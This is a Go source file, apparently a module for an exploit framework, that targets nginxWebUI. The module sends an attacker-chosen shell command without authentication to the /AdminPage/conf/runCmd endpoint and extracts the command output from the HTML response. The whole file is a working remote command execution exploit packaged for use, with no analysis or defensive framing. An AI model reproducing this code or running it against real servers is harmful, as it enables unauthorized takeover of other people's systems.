package exp_nginxWebUI

import (
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"regexp"
	"strings"
)

type Exp_runCmd_unauthorized struct {
	exp_templates.ExpTemplate
}

func (self *Exp_runCmd_unauthorized) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	headers := self.GetInitExpHeaders()
	payload := "cmd={#cmd}"
	payload = strings.Replace(payload, "{#cmd}", cmd, 1)
	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/AdminPage/conf/runCmd"), payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if !strings.Contains(httpresp.Body, `obj`) {
		self.EchoErrMsg("漏洞不存在！")
	}
	result := regexp.MustCompile(`</span><br>\s*(.*)`).FindStringSubmatch(httpresp.Body)
	res := strings.ReplaceAll(result[1], "<br>", "\n")
	res = strings.ReplaceAll(res, "运行失败", "")
	res = strings.ReplaceAll(res, "运行成功", "")
	res = strings.ReplaceAll(res, "\"}", "")
	expResult.Status = true
	expResult.Result = res
	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_runCmd_unauthorized{}, "exp_runCmd_unauthorized.yml")

}
